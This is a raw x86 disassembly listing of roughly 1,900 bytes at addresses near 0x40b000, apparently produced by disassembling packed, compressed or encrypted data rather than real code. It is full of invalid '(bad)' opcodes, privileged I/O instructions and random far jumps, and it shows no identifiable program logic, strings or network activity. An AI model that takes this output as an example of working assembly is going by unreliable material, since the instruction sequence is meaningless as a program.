  40af49:	or     al,0x52
  40af4b:	scas   eax,DWORD PTR es:[edi]
  40af4c:	sub    ebx,DWORD PTR [ebx]
  40af4e:	fidiv  DWORD PTR [esi-0x1786ffde]
  40af54:	aaa    
  40af55:	push   ss
  40af56:	mov    cl,0x67
  40af58:	(bad)  
  40af59:	fwait
  40af5a:	push   0x556ceee5
  40af5f:	(bad)  
  40af60:	mov    esi,0xeda45d32
  40af65:	or     al,0x59
  40af67:	mov    edx,0x945e2097
  40af6c:	imul   BYTE PTR ss:[ecx+0x2f]
  40af70:	cli    
  40af71:	push   cs
  40af72:	push   esp
  40af73:	arpl   WORD PTR [ecx+0x5f531b3e],cx
  40af79:	in     eax,dx
  40af7a:	imul   ebx,DWORD PTR ds:0x59744a80,0x70
  40af81:	push   ecx
  40af82:	mov    bh,0x12
  40af84:	aad    0xe7
  40af86:	cmp    eax,0xd3de21cc
  40af8b:	mov    edx,0xc9d1e624
  40af90:	push   ds
  40af91:	add    bh,ah
  40af93:	adc    DWORD PTR [eax],ebx
  40af95:	pushf  
  40af96:	cmp    BYTE PTR [ecx+edx*2],ah
  40af99:	cmc    
  40af9a:	mov    edi,0xfd821283
  40af9f:	das    
  40afa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa1:	cmc    
  40afa2:	imul   edi,DWORD PTR [ecx-0x4be6ae95],0x3ca5cd57
  40afac:	lods   eax,DWORD PTR ds:[esi]
  40afad:	outs   dx,DWORD PTR ds:[esi]
  40afae:	gs mov dh,0x8
  40afb1:	cmp    bl,BYTE PTR [edx-0x247e5b9d]
  40afb7:	jmp    FWORD PTR ds:0xb5966ee1
  40afbd:	ds mov dh,0xc2
  40afc0:	nop
  40afc1:	mov    ebp,0xecbe1b2c
  40afc6:	pop    es
  40afc7:	out    0x9b,al
  40afc9:	neg    BYTE PTR [edx+eiz*1+0x68]
  40afcd:	retf   0x3eb8
  40afd0:	and    DWORD PTR [esp+edx*2-0x51],ebp
  40afd4:	mov    eax,0x3cb21710
  40afd9:	or     eax,0xf7ae9642
  40afde:	out    dx,eax
  40afdf:	hlt    
  40afe0:	stc    
  40afe1:	adc    esi,ecx
  40afe3:	push   ds
  40afe4:	mov    eax,ds:0x7beb1498
  40afe9:	add    eax,ecx
  40afeb:	add    eax,0x47535f4f
  40aff0:	js     0x40afa7
  40aff2:	repz inc esp
  40aff4:	mov    cl,0x41
  40aff6:	icebp  
  40aff7:	and    DWORD PTR [edx+eiz*8-0x47],ebp
  40affb:	or     eax,0xded01bb0
  40b000:	and    eax,0xd0854d05
  40b005:	lods   al,BYTE PTR ds:[esi]
  40b006:	jno    0x40b00c
  40b008:	stos   DWORD PTR es:[edi],eax
  40b009:	ret    0xa4e4
  40b00c:	fidiv  WORD PTR [ebx]
  40b00e:	loope  0x40b041
  40b010:	in     eax,0xd8
  40b012:	cmp    DWORD PTR [ebx+0x4e87ba30],ebx
  40b018:	fldcw  WORD PTR [eax+0x33f28a47]
  40b01e:	sbb    edi,DWORD PTR [ebx]
  40b020:	scas   al,BYTE PTR es:[edi]
  40b021:	in     al,0xf1
  40b023:	mov    ebp,0xcffb70b9
  40b028:	jno    0x40b04c
  40b02a:	cli    
  40b02b:	jle    0x40b03e
  40b02d:	xchg   edi,eax
  40b02e:	xor    bl,BYTE PTR [esi+0xc6fc5df]
  40b034:	(bad)  
  40b035:	jmp    0xfa77:0x93a4a1c1
  40b03c:	pop    es
  40b03d:	test   eax,0xea05fba3
  40b042:	sbb    BYTE PTR [esi],bl
  40b044:	test   eax,0xc6862b40
  40b049:	xor    al,0x9f
  40b04b:	inc    ebx
  40b04c:	das    
  40b04d:	int    0x0
  40b04f:	sbb    ebp,0xac908773
  40b055:	ja     0x40b042
  40b057:	adc    dl,bl
  40b059:	jb     0x40b04a
  40b05b:	adc    dh,BYTE PTR [esi+0x66f39203]
  40b061:	shl    BYTE PTR ds:0xede3e697,1
  40b067:	dec    ecx
  40b068:	in     al,0x6f
  40b06a:	jl     0x40b08d
  40b06c:	sbb    BYTE PTR [edx-0x47ea80b6],bl
  40b072:	ds push ecx
  40b074:	pusha  
  40b075:	test   al,0x99
  40b077:	shl    edx,0xf0
  40b07a:	leave  
  40b07b:	sbb    al,0x7b
  40b07d:	fcomp  DWORD PTR [ebx]
  40b07f:	in     al,dx
  40b080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b081:	jne    0x40b0c6
  40b083:	imul   esp,DWORD PTR [ecx-0x7e],0xffffff8c
  40b087:	ficomp DWORD PTR [ecx]
  40b089:	xor    DWORD PTR [edi-0x65],esi
  40b08c:	push   0xfffffffb
  40b08e:	pop    ecx
  40b08f:	add    eax,DWORD PTR [ecx+0x4cae1a0f]
  40b095:	sbb    dh,ah
  40b097:	ins    BYTE PTR es:[edi],dx
  40b098:	sbb    eax,0x7d2e93f
  40b09d:	inc    edi
  40b09e:	push   edi
  40b09f:	nop
  40b0a0:	jmp    0x40b0f4
  40b0a2:	hlt    
  40b0a3:	ja     0x40b0cb
  40b0a5:	pop    edx
  40b0a6:	sbb    esi,DWORD PTR [esi]
  40b0a8:	and    edi,DWORD PTR [edi+0x66]
  40b0ab:	dec    edi
  40b0ac:	xchg   cx,ax
  40b0ae:	retf   0x38cb
  40b0b1:	std    
  40b0b2:	cs add eax,0xe30a28dc
  40b0b8:	or     ch,BYTE PTR [esi]
  40b0ba:	xor    bl,BYTE PTR [esi+0x31aef79]
  40b0c0:	jmp    0xffdd7905
  40b0c5:	cmp    ch,BYTE PTR [ecx-0x5193c670]
  40b0cb:	mov    bl,BYTE PTR es:[ebp+0x289e9505]
  40b0d2:	fcom   st(2)
  40b0d4:	ret    0x8e8d
  40b0d7:	shr    BYTE PTR [ecx+0x2ac88988],cl
  40b0dd:	sbb    BYTE PTR [ebp+0xcae23dc],bh
  40b0e3:	and    bl,BYTE PTR [ebp+0x2d012652]
  40b0e9:	jecxz  0x40b0be
  40b0eb:	add    eax,0x3bfda83
  40b0f0:	daa    
  40b0f1:	imul   eax,DWORD PTR [ecx-0xa90af12],0xffffffe8
  40b0f8:	sbb    BYTE PTR [ebx+0x7c],dl
  40b0fb:	mov    al,ds:0x21702101
  40b100:	jmp    0x3560:0x843876e7
  40b107:	dec    esi
  40b108:	or     al,0xe5
  40b10a:	inc    edx
  40b10b:	or     ebp,DWORD PTR [ebp+0x6e]
  40b10e:	imul   eax,edi,0xfffffff6
  40b111:	mov    al,ds:0x28c92921
  40b116:	jmp    0x104f57d3
  40b11b:	icebp  
  40b11c:	jb     0x40b10c
  40b11e:	repz dec ebx
  40b120:	dec    ebx
  40b121:	lahf   
  40b122:	fsub   st(0),st
  40b124:	(bad)  
  40b125:	aas    
  40b126:	(bad)  
  40b127:	mov    ah,0xeb
  40b129:	test   ecx,edi
  40b12b:	fs push esp
  40b12d:	out    dx,eax
  40b12e:	or     dh,bh
  40b130:	push   edi
  40b131:	rcr    dl,cl
  40b133:	out    0xe3,al
  40b135:	iret   
  40b136:	js     0x40b15e
  40b138:	jo     0x40b150
  40b13a:	pop    ebx
  40b13b:	es pushf 
  40b13d:	push   edx
  40b13e:	lahf   
  40b13f:	arpl   WORD PTR [edi+0x7bd363fa],di
  40b145:	sub    eax,0xd68d194d
  40b14a:	cmp    ah,ah
  40b14c:	lock sub BYTE PTR [ecx-0x6cf3ec29],0xb2
  40b154:	sbb    DWORD PTR [ebp+0x4ee1668e],ebx
  40b15a:	dec    ecx
  40b15b:	push   ebp
  40b15c:	(bad)  
  40b15d:	cmp    DWORD PTR [ecx+0x36],esi
  40b160:	addr16 mov esp,0x8bbbafca
  40b166:	inc    esp
  40b167:	int    0x58
  40b169:	mov    al,ds:0xf32bb9ef
  40b16e:	cmp    BYTE PTR ds:0x716e4151,dl
  40b174:	std    
  40b175:	sbb    DWORD PTR [ebx+0x4b919eb3],esi
  40b17b:	pop    ds
  40b17c:	scas   al,BYTE PTR es:[edi]
  40b17d:	cmp    al,0x6a
  40b17f:	add    ah,BYTE PTR [ebx+0x54]
  40b182:	push   ss
  40b183:	inc    esp
  40b184:	(bad)  
  40b185:	rcl    BYTE PTR [edx-0x64de7882],0x1
  40b18c:	jb     0x40b153
  40b18e:	mov    edx,0x5858ce8e
  40b193:	mov    ds:0xd0ac7e38,eax
  40b198:	(bad)  
  40b199:	jb     0x40b1bd
  40b19b:	jno    0x40b11d
  40b19d:	mov    ds:0x460b7237,eax
  40b1a2:	rcpps  xmm1,xmm2
  40b1a5:	xor    ah,BYTE PTR ds:0xcc607cb6
  40b1ab:	(bad)  
  40b1ad:	repnz mov al,0xd6
  40b1b0:	sbb    edx,DWORD PTR [ebx]
  40b1b2:	and    DWORD PTR [edi+0x7a],ecx
  40b1b5:	dec    edi
  40b1b6:	test   al,0xad
  40b1b8:	addr16 popa 
  40b1ba:	cmp    ch,ch
  40b1bc:	nop
  40b1bd:	jbe    0x40b186
  40b1bf:	jbe    0x40b1f9
  40b1c1:	dec    edx
  40b1c2:	aad    0x9b
  40b1c4:	sub    al,0x90
  40b1c6:	test   DWORD PTR [esi],0x2290eca8
  40b1cc:	xor    ebx,eax
  40b1ce:	ins    DWORD PTR es:[edi],dx
  40b1cf:	inc    ebp
  40b1d0:	or     bl,BYTE PTR [ecx+0x64881cc7]
  40b1d6:	inc    ebx
  40b1d7:	and    DWORD PTR [eax+0x64],0x27
  40b1db:	loop   0x40b201
  40b1dd:	retf   
  40b1de:	or     dl,al
  40b1e0:	adc    dl,BYTE PTR [edx-0x57]
  40b1e3:	inc    ecx
  40b1e4:	enter  0x2ea4,0x50
  40b1e8:	retf   0x71eb
  40b1eb:	jne    0x40b225
  40b1ed:	sbb    BYTE PTR [edi],bl
  40b1ef:	sub    BYTE PTR [eax-0x1fe49481],cl
  40b1f5:	xchg   edi,eax
  40b1f6:	lock mov ah,0x2d
  40b1f9:	lea    eax,ds:0xd840878f
  40b1ff:	lods   al,BYTE PTR ds:[esi]
  40b200:	pop    eax
  40b201:	lahf   
  40b202:	out    dx,al
  40b203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b204:	js     0x40b244
  40b206:	pop    ss
  40b207:	jle    0x40b220
  40b209:	xlat   BYTE PTR ds:[ebx]
  40b20a:	or     BYTE PTR [ecx+0x9eb241e],dl
  40b210:	gs mov ebp,0x9b85d4a
  40b216:	adc    BYTE PTR [edx+0x7f],ah
  40b219:	iretw  
  40b21b:	push   eax
  40b21c:	adc    edx,DWORD PTR [edx+0x5c]
  40b21f:	fld    st(5)
  40b221:	lods   al,BYTE PTR ds:[esi]
  40b222:	outs   dx,DWORD PTR ds:[esi]
  40b223:	sbb    BYTE PTR [edx+0x34288f59],0x64
  40b22a:	and    eax,0x46a7f236
  40b22f:	dec    ebp
  40b231:	add    DWORD PTR [ebx-0x4758844],edi
  40b237:	and    BYTE PTR [esi+0x5c73a662],ch
  40b23d:	imul   eax,edi,0x7f
  40b240:	out    0xfe,eax
  40b242:	mov    esp,edx
  40b244:	xor    DWORD PTR [edx-0x5a890827],edx
  40b24a:	xchg   ebx,ecx
  40b24c:	xor    eax,0x8e81aa97
  40b251:	cmp    edx,DWORD PTR [esi+ecx*1-0x46]
  40b255:	dec    esi
  40b256:	out    0x35,al
  40b258:	or     eax,0x2cf4451
  40b25d:	pop    ds
  40b25e:	jecxz  0x40b230
  40b260:	in     al,0xd5
  40b262:	xchg   edi,eax
  40b263:	cmp    DWORD PTR [ebx-0x3b2460cb],0xffffffb4
  40b26a:	loope  0x40b2c7
  40b26c:	into   
  40b26d:	or     bl,ah
  40b26f:	jbe    0x40b28a
  40b271:	fstp   QWORD PTR [ecx-0x45b76a9a]
  40b277:	imul   DWORD PTR [esi+edi*2+0x5dad3d59]
  40b27e:	loope  0x40b274
  40b280:	push   edi
  40b281:	sbb    DWORD PTR ds:0xa5090bcb,ecx
  40b287:	repz lahf 
  40b289:	inc    edi
  40b28a:	int3   
  40b28b:	int    0xc7
  40b28d:	stos   BYTE PTR es:[edi],al
  40b28e:	outs   dx,DWORD PTR ds:[esi]
  40b28f:	inc    ebx
  40b290:	not    ebp
  40b292:	sub    al,0x51
  40b294:	sub    ch,BYTE PTR [esi+0x2fe05c7e]
  40b29a:	jge    0x40b2c0
  40b29c:	inc    ebp
  40b29d:	jns    0x40b28b
  40b29f:	mov    BYTE PTR [ecx+0x45],bh
  40b2a2:	pop    esi
  40b2a3:	sbb    al,BYTE PTR [esi-0x4b]
  40b2a6:	and    bh,BYTE PTR [esi]
  40b2a8:	and    bh,BYTE PTR [edi-0x1d4b5dbd]
  40b2ae:	jl     0x40b2cd
  40b2b0:	pop    DWORD PTR [ebp+eax*8-0x42a8fc77]
  40b2b7:	test   DWORD PTR [ebx-0x74],esi
  40b2ba:	fsub   st(5),st
  40b2bc:	mov    dl,0x1b
  40b2be:	mov    esp,0x73d03622
  40b2c3:	xor    esi,DWORD PTR [ecx]
  40b2c5:	cdq    
  40b2c6:	mov    bl,0xdf
  40b2c8:	retf   0x46ab
  40b2cb:	xchg   edi,eax
  40b2cc:	js     0x40b282
  40b2ce:	mov    cl,0x63
  40b2d0:	sub    al,0x63
  40b2d2:	mov    ch,BYTE PTR [ebp+0x1a]
  40b2d5:	sbb    BYTE PTR [edx],ah
  40b2d7:	pop    ebp
  40b2d8:	pop    eax
  40b2d9:	loopne 0x40b356
  40b2db:	ret    
  40b2dc:	dec    BYTE PTR [edi-0x4094b82f]
  40b2e2:	mov    bl,0x19
  40b2e4:	mov    edi,0x4c2cde75
  40b2e9:	and    eax,0x33d909d2
  40b2ee:	outs   dx,BYTE PTR ds:[esi]
  40b2ef:	cmp    DWORD PTR [esi+0xf],edi
  40b2f2:	arpl   cx,di
  40b2f4:	lds    edx,FWORD PTR [ebp+0x52]
  40b2f7:	shl    BYTE PTR [edx],0xc5
  40b2fa:	sbb    BYTE PTR [esi+0x4f],bh
  40b2fd:	mov    ds:0xb52a2fa4,eax
  40b302:	sbb    eax,0xeb467342
  40b307:	xor    edi,ebx
  40b309:	mov    ch,0x9e
  40b30b:	inc    esi
  40b30c:	popf   
  40b30d:	inc    esi
  40b30e:	lock lods al,BYTE PTR ds:[esi]
  40b310:	call   0xa8217bfe
  40b315:	mov    al,ds:0x3ede5f50
  40b31a:	imul   ecx,DWORD PTR [edi],0x5c50ecf2
  40b320:	out    0x31,eax
  40b322:	mov    ah,0x90
  40b324:	ror    esp,cl
  40b326:	xchg   ebp,eax
  40b327:	push   ebx
  40b328:	push   ss
  40b329:	not    DWORD PTR [eax-0x40debd7]
  40b32f:	or     DWORD PTR [eax],ebp
  40b331:	mov    dl,0x74
  40b333:	mov    BYTE PTR [edi-0x6b637b12],bl
  40b339:	mov    edx,0x16e8536
  40b33e:	xchg   ebx,eax
  40b33f:	aad    0xc2
  40b341:	mov    WORD PTR [ebp+0x1d13f486],ds
  40b347:	mov    esi,0x25473cca
  40b34c:	sub    bl,BYTE PTR [eax]
  40b34e:	ret    0x84c1
  40b351:	pop    edi
  40b352:	cmp    DWORD PTR [eax+0x2bf11400],edx
  40b358:	add    DWORD PTR [edx+0x1d7d0ff8],ebx
  40b35e:	jne    0x40b2e1
  40b360:	out    0xc7,al
  40b362:	repz xor ebx,DWORD PTR [eax]
  40b365:	jmp    0x64d57ec9
  40b36a:	lahf   
  40b36b:	mov    DWORD PTR [ecx+0x16],ebx
  40b36e:	call   0x5cf53e08
  40b373:	push   esp
  40b374:	ja     0x40b35a
  40b376:	gs js  0x40b3ae
  40b379:	push   cs
  40b37a:	dec    edx
  40b37b:	push   eax
  40b37c:	cmp    DWORD PTR [edi],0xffffffd3
  40b37f:	xchg   ebx,eax
  40b380:	das    
  40b381:	pop    ds
  40b382:	or     bh,BYTE PTR [esi-0x67f0341e]
  40b388:	daa    
  40b389:	push   cs
  40b38a:	mov    ecx,0xfc9c0ba2
  40b38f:	sub    eax,0x1225ab4d
  40b394:	rol    DWORD PTR [ebx+0x10],0x78
  40b398:	shl    BYTE PTR [edx],1
  40b39a:	int3   
  40b39b:	pop    edx
  40b39c:	shl    BYTE PTR [eax-0x39b9e7c6],1
  40b3a2:	jle    0x40b332
  40b3a4:	in     eax,dx
  40b3a5:	stc    
  40b3a6:	cmp    eax,0x743d0010
  40b3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3ac:	push   ss
  40b3ad:	xchg   ch,dl
  40b3af:	mov    ss:0x7251859a,al
  40b3b5:	adc    ecx,DWORD PTR [eax-0x75]
  40b3b8:	das    
  40b3b9:	fwait
  40b3ba:	add    eax,0xd8a570a0
  40b3bf:	or     esi,eax
  40b3c1:	xchg   esi,esp
  40b3c3:	sub    ebp,DWORD PTR [eax+0xe]
  40b3c6:	cmp    eax,0x89309136
  40b3cb:	mov    al,cs:0x3c091bbe
  40b3d1:	rol    BYTE PTR ds:0x85f0523f,1
  40b3d7:	jns    0x40b410
  40b3d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3da:	test   DWORD PTR [eax],ebx
  40b3dc:	pop    esp
  40b3dd:	scas   al,BYTE PTR es:[edi]
  40b3de:	cmp    BYTE PTR [esi-0x52d85a74],ch
  40b3e4:	and    BYTE PTR [ebx-0x7a],ah
  40b3e7:	adc    esi,DWORD PTR [eax+0x44]
  40b3ea:	dec    eax
  40b3eb:	shl    ebx,0xda
  40b3ee:	out    dx,al
  40b3ef:	cwde   
  40b3f0:	or     al,0x45
  40b3f2:	out    0xe0,al
  40b3f4:	loop   0x40b3fd
  40b3f6:	js     0x40b42c
  40b3f8:	inc    edi
  40b3f9:	cmp    eax,0xee134a12
  40b3fe:	adc    al,0x1
  40b400:	aaa    
  40b401:	xor    bh,BYTE PTR [ebp-0x26]
  40b404:	push   0x16
  40b406:	sar    DWORD PTR [eax+0x62],1
  40b409:	sub    DWORD PTR [ebp+0x649dc91e],esi
  40b40f:	inc    BYTE PTR [edi+0x6a]
  40b412:	jo     0x40b45d
  40b414:	inc    esi
  40b415:	rsm    
  40b417:	mov    eax,0x3cf9b284
  40b41c:	and    eax,0x2753d275
  40b421:	test   BYTE PTR [ebp-0x73],dh
  40b424:	sub    edi,DWORD PTR [edx]
  40b426:	out    dx,al
  40b427:	add    ebx,DWORD PTR [ebp+0x7f049ed8]
  40b42d:	fadd   st,st(3)
  40b42f:	push   ecx
  40b430:	popa   
  40b431:	iret   
  40b432:	mov    al,0xeb
  40b434:	mov    ds:0xdaa3221a,al
  40b439:	add    al,0x55
  40b43b:	mov    ch,0xf
  40b43d:	mov    al,0x2e
  40b43f:	cwde   
  40b440:	xchg   ebx,eax
  40b441:	add    ebx,DWORD PTR [ebp-0x2cf7404d]
  40b447:	xchg   DWORD PTR [ebx-0x33],esp
  40b44a:	rol    ch,1
  40b44c:	out    0x96,eax
  40b44e:	fimul  DWORD PTR [ebp-0x12b0f89a]
  40b454:	ficomp DWORD PTR [ebx-0xf]
  40b457:	push   ds
  40b458:	fsubr  DWORD PTR [edx+edx*1-0x9335e13]
  40b45f:	ss ror al,0xba
  40b463:	in     eax,dx
  40b464:	outs   dx,DWORD PTR ds:[esi]
  40b465:	xchg   esi,eax
  40b466:	and    dl,BYTE PTR [ecx-0x484caffa]
  40b46c:	fstp   DWORD PTR [eax+ebx*1-0x68fc1344]
  40b473:	ins    DWORD PTR es:[edi],dx
  40b474:	push   ecx
  40b475:	rol    BYTE PTR [esi+ecx*4+0x8b422e2],0x65
  40b47d:	mov    ch,0x92
  40b47f:	sbb    ebp,edi
  40b481:	jo     0x40b4e5
  40b483:	les    edi,FWORD PTR [esi+0x72c53ac7]
  40b489:	das    
  40b48a:	lock in al,dx
  40b48c:	out    0x2e,eax
  40b48e:	(bad)  
  40b48f:	call   0x692:0xee0a7e04
  40b496:	add    BYTE PTR [eax],0x0
	...
  40b511:	add    BYTE PTR [eax],al
  40b513:	add    bh,ah
  40b515:	adc    BYTE PTR [ebp-0x27],bh
  40b518:	(bad)  
  40b519:	std    
  40b51a:	out    0x3e,eax
  40b51c:	lods   eax,DWORD PTR ds:[esi]
  40b51d:	add    dh,ah
  40b51f:	shr    DWORD PTR [ecx+edi*8-0x47],cl
  40b523:	sbb    ebp,DWORD PTR [ecx]
  40b525:	data16 add BYTE PTR [eax],al
  40b528:	imul   eax,DWORD PTR [edi],0x0
  40b52b:	add    BYTE PTR [ecx-0x56],ch
  40b52e:	mov    esp,0xb9c8995b
  40b533:	inc    ebp
  40b534:	mov    ?,WORD PTR [esp+ebx*8+0x6d]
  40b538:	adc    eax,0xfc09cede
  40b53d:	mov    dh,0xf5
  40b53f:	mov    ecx,0x4d17b346
  40b544:	int3   
  40b545:	sahf   
  40b546:	and    BYTE PTR [ebx*4-0x40381644],al
  40b54d:	or     BYTE PTR [esi+0x65],ch
  40b550:	or     ecx,DWORD PTR [ebp+0x3b531097]
  40b556:	inc    esi
  40b557:	push   DWORD PTR [esi]
  40b559:	or     BYTE PTR [ecx],0x3a
  40b55c:	pop    ebx
  40b55d:	scas   eax,DWORD PTR es:[edi]
  40b55e:	aam    0xc3
  40b560:	out    dx,eax
  40b561:	dec    ebp
  40b562:	retf   
  40b563:	in     eax,dx
  40b564:	mov    al,cs:0xaa47edb0
  40b56a:	into   
  40b56b:	or     cl,al
  40b56d:	xor    BYTE PTR [ebp-0x26],dl
  40b570:	add    bh,al
  40b572:	jns    0x40b55a
  40b574:	jbe    0x40b500
  40b576:	je     0x40b59e
  40b578:	jmp    0x40b540
  40b57a:	inc    edx
  40b57b:	pop    ebx
  40b57c:	pop    esi
  40b57d:	pusha  
  40b57e:	cli    
  40b57f:	jne    0x40b55a
  40b581:	adc    eax,0xdae7df96
  40b586:	lds    ecx,FWORD PTR [ecx-0x44530db2]
  40b58c:	push   edx
  40b58d:	mov    ebp,0x3752aeee
  40b592:	lock clc 
  40b594:	addr16 push ebp
  40b596:	popf   
  40b597:	sub    BYTE PTR [edx],cl
  40b599:	xor    bh,BYTE PTR [ecx]
  40b59b:	pop    ebp
  40b59c:	mov    edx,0xb0923a48
  40b5a1:	repz test DWORD PTR [esi],0xdb13c4d9
  40b5a8:	lea    esp,[ebp+ebp*8+0x1a]
  40b5ac:	call   0x8ee1:0x38de8997
  40b5b3:	add    BYTE PTR [edx-0x4cb0352f],cl
  40b5b9:	or     esp,DWORD PTR [ebx+esi*1+0x61702b26]
  40b5c0:	xor    dl,0xc2
  40b5c3:	fwait
  40b5c4:	rep outs dx,BYTE PTR ds:[esi]
  40b5c6:	fadd   DWORD PTR [edi]
  40b5c8:	sbb    DWORD PTR [ebx],eax
  40b5ca:	int    0xc0
  40b5cc:	shr    BYTE PTR [ecx],1
  40b5ce:	aam    0xc0
  40b5d0:	sub    eax,ecx
  40b5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5d3:	cmp    BYTE PTR [eax+esi*8-0x5227c577],al
  40b5da:	jnp    0x40b57f
  40b5dc:	stc    
  40b5dd:	lods   al,BYTE PTR ds:[esi]
  40b5de:	cmp    cl,BYTE PTR [ecx-0x67]
  40b5e1:	jbe    0x40b5a0
  40b5e3:	test   eax,0xfd64ca5e
  40b5e8:	xor    eax,0x96e6c250
  40b5ed:	mov    bl,bl
  40b5ef:	xor    DWORD PTR [edx],ebp
  40b5f1:	cmp    cl,BYTE PTR [edx+0x18e04b84]
  40b5f7:	lea    edi,[ebx-0x716954e0]
  40b5fd:	imul   edx,DWORD PTR [ebp-0x51],0x8a9794c1
  40b604:	mov    ds:0x97bbf3b3,eax
  40b609:	outs   dx,BYTE PTR ds:[esi]
  40b60a:	jno    0x40b5b2
  40b60c:	neg    BYTE PTR [edx]
  40b60e:	int3   
  40b60f:	add    al,0xce
  40b611:	les    ebx,FWORD PTR [ebx+ebx*1+0x6402b82b]
  40b618:	jmp    0xf6c1180c
  40b61d:	add    al,0xcc
  40b61f:	sbb    eax,0xd2b3435f
  40b624:	dec    eax
  40b625:	retf   0x8397
  40b628:	inc    edi
  40b629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62a:	push   eax
  40b62b:	rcr    DWORD PTR [ebp+0x24],0xa7
  40b62f:	sub    BYTE PTR [ebp-0x4d],0xd6
  40b633:	sbb    edx,DWORD PTR [ecx+0x76]
  40b636:	adc    al,0x7d
  40b638:	and    eax,DWORD PTR [ebp-0x24]
  40b63b:	ins    DWORD PTR es:[edi],dx
  40b63c:	push   ds
  40b63d:	inc    ecx
  40b63e:	daa    
  40b63f:	fbld   TBYTE PTR [esi+0x32]
  40b642:	mov    al,ds:0x9f0f5f5
  40b647:	daa    
  40b648:	test   al,0xcb
  40b64a:	mov    ds:0x89b8ce04,al
  40b64f:	(bad)  
  40b651:	in     al,dx
  40b652:	sbb    BYTE PTR [eax-0x40],0x5c
  40b656:	sbb    al,BYTE PTR [ecx+0x2e7c535b]
  40b65c:	rol    ah,0x47
  40b65f:	fmul   QWORD PTR [edi-0x4c6d3b4d]
  40b665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b666:	sub    eax,ebp
  40b668:	mov    ch,0xe
  40b66a:	jle    0x40b671
  40b66c:	mov    dh,0x23
  40b66e:	fisttp DWORD PTR [ecx-0x3344419d]
  40b674:	xchg   esi,eax
  40b675:	adc    DWORD PTR [edi-0x4a],esp
  40b678:	div    BYTE PTR [ecx+0x5a]
  40b67b:	xchg   esp,eax
  40b67c:	ror    BYTE PTR [ebx],1
  40b67e:	inc    eax
  40b67f:	dec    esp
  40b680:	int    0x22
  40b682:	xchg   DWORD PTR [ebx-0x11b6dea3],eax
  40b688:	add    BYTE PTR [ecx+0x48f9b6bd],cl
  40b68e:	inc    esi
  40b68f:	pop    es
  40b690:	pop    edx
  40b691:	inc    eax
  40b692:	dec    ecx
  40b693:	fprem  
  40b695:	cli    
  40b696:	sbb    ch,dl
  40b698:	pop    edx
  40b699:	dec    BYTE PTR [ebx+0x15647efa]
  40b69f:	dec    edi
  40b6a0:	retf   
  40b6a1:	addr16 push esi
  40b6a3:	xchg   ebx,eax
  40b6a4:	sbb    al,0x4
  40b6a6:	test   BYTE PTR [ebx-0x15dcf896],dl
  40b6ac:	fdiv   DWORD PTR ds:0x2135b2c5
  40b6b2:	je     0x40b691
  40b6b4:	inc    ebx
  40b6b5:	pop    es
  40b6b6:	sub    eax,0x23e8014e
  40b6bb:	push   esi
  40b6bc:	and    BYTE PTR [edx-0x24],bl
  40b6bf:	sub    al,0x57
  40b6c1:	sbb    bl,BYTE PTR [edx-0x7]
  40b6c4:	jno    0x40b6e9
  40b6c6:	mov    dh,0x84
  40b6c8:	hlt    
  40b6c9:	stc    
  40b6ca:	lahf   
  40b6cb:	mov    edi,0xfa2155d0
  40b6d0:	push   eax
  40b6d1:	out    0xb0,eax
  40b6d3:	(bad)  
  40b6d4:	out    0x9,eax
  40b6d6:	shr    BYTE PTR [esi-0x424e3f3],1
  40b6dc:	adc    al,0xb1
  40b6de:	add    eax,0xc39220e3
  40b6e3:	add    cl,0xce
  40b6e6:	mov    WORD PTR [ebp-0x5e48e8be],fs
  40b6ec:	mov    es,WORD PTR [esi+edi*1+0x1f87d655]
  40b6f3:	adc    al,0x0
  40b6f5:	add    al,0x4c
  40b6f7:	(bad)  
  40b6f8:	(bad)  
  40b6f9:	mov    ebx,0x2cc57ffa
  40b6fe:	loop   0x40b6b0
  40b700:	mov    al,bh
  40b702:	int    0xe5
  40b704:	pop    ds
  40b705:	mov    eax,0x67792b14
  40b70a:	(bad)  
  40b70b:	mov    esi,0x70e65487
  40b710:	sub    esp,ebp
  40b712:	sub    ebp,DWORD PTR ss:[edi]
  40b715:	cmp    DWORD PTR [edx-0x5b21e917],esp
  40b71b:	xchg   edi,eax
  40b71c:	and    eax,ecx
  40b71e:	and    BYTE PTR [ecx+0x1da217f4],al
  40b724:	mov    bh,0x38
  40b726:	jns    0x40b6fd
  40b728:	or     ebp,DWORD PTR [ecx+0x77c7dc89]
  40b72e:	or     edx,ebx
  40b730:	pushf  
  40b731:	test   DWORD PTR [edi-0x1841a734],0x632f807e
  40b73b:	adc    al,BYTE PTR [edi+0x6a]
  40b73e:	mov    esp,0x21cc9bf6
  40b743:	daa    
  40b744:	into   
  40b745:	shr    DWORD PTR [ebp+0x5],cl
  40b748:	mov    eax,ds:0x34d18d9c
  40b74d:	nop
  40b74e:	and    ah,BYTE PTR [esi+0x60]
  40b751:	es nop
  40b753:	and    dh,BYTE PTR [ecx+0x21d662ee]
  40b759:	call   0x91e126cd
  40b75e:	out    dx,eax
  40b75f:	push   ecx
  40b760:	ficom  DWORD PTR [ecx+0x301c53bf]
  40b766:	(bad)  
  40b767:	cli    
  40b768:	adc    ebx,esi
  40b76a:	stos   BYTE PTR es:[edi],al
  40b76b:	inc    ecx
  40b76c:	pop    esi
  40b76d:	(bad)  
  40b76e:	jo     0x40b753
  40b770:	sub    BYTE PTR [edi],bl
  40b772:	jg     0x40b778
  40b774:	repnz test al,0x1b
  40b777:	jne    0x40b7bb
  40b779:	(bad)  
  40b77a:	push   ebp
  40b77b:	aad    0x38
  40b77d:	nop
  40b77e:	out    dx,al
  40b77f:	pop    ss
  40b780:	sar    dh,0xda
  40b783:	mov    cl,0xa3
  40b785:	bound  esp,QWORD PTR [ecx-0x1d302f8a]
  40b78b:	adc    ch,al
  40b78d:	pop    ecx
  40b78e:	mov    bl,0x99
  40b790:	hlt    
  40b791:	mov    bh,0x4a
  40b793:	call   DWORD PTR [edi+0x45]
  40b796:	stc    
  40b797:	push   ds
  40b798:	add    al,0xce
  40b79a:	sahf   
  40b79b:	call   0xc9186dea
  40b7a0:	and    dh,bl
  40b7a2:	int3   
  40b7a3:	mov    edi,0xef808678
  40b7a8:	mov    ecx,0xbcc997e
